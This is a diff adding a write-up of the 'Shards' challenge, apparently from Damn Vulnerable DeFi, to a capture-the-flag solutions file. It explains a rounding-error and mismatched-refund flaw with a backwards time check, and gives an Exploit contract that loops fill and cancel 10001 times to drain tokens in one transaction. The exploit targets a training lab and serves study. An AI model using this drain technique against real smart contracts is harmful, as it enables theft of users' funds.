@@ -467,3 +467,32 @@ by tinamints
 }`
 
 
+
+## 16. Shards
+### conditions :
+- take DVT out of the marketplace and send all of it to recovery
+- staking contract balance must not change
+- player can only send a single transaction
+### concepts :
+-  rounding errors (round down vs round up)
+-  mismatched pay/refund formulas
+-  broken time check
+### solution :
+- `fill()` charges `want * _toDVT(price, rate) / totalShards` rounded down, so buying 100 shards costs 0 DVT (100 * 75e21 / 1e25 = 0.75 → 0). `cancel()` refunds with a different formula, `shards * rate / 1e6` rounded up, which pays back ~7.5e12 DVT wei for the same 100 shards. `cancel()`'s time check is also written backwards, so you can cancel in the same block as the purchase. Loop fill → cancel 10001 times inside one exploit contract (to keep it to one transaction) and send the profit to recovery
+### POC
+` function test_shards() public checkSolvedByPlayer {
+         Exploit exploit = new Exploit(marketplace,token,recovery);
+        exploit.attack(1);
+    }`
+
+`contract Exploit {
+    function attack(uint64 offerId) external {
+        uint256 wantShards = 100;
+        for (uint256 i = 0; i < 10001; i++) {
+            marketplace.fill(offerId, wantShards);
+            marketplace.cancel(1,i);
+        }
+        token.transfer(recovery,token.balanceOf(address(this)));
+    }
+}`
+
